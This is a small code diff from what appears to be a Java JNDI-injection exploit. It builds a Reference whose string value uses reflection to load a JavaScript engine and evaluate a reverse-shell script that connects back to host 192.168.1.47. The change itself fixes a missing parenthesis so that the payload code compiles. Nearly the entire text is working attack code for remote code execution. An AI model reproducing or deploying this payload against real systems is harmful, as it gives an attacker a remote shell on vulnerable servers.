@@ -26,4 +26,4 @@ String command = "var host = '192.168.1.47';" +
                        "p.destroy();"+
                        "s.close();";
 String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
-ref.add(new StringRefAddr("x", x);
+ref.add(new StringRefAddr("x", x));
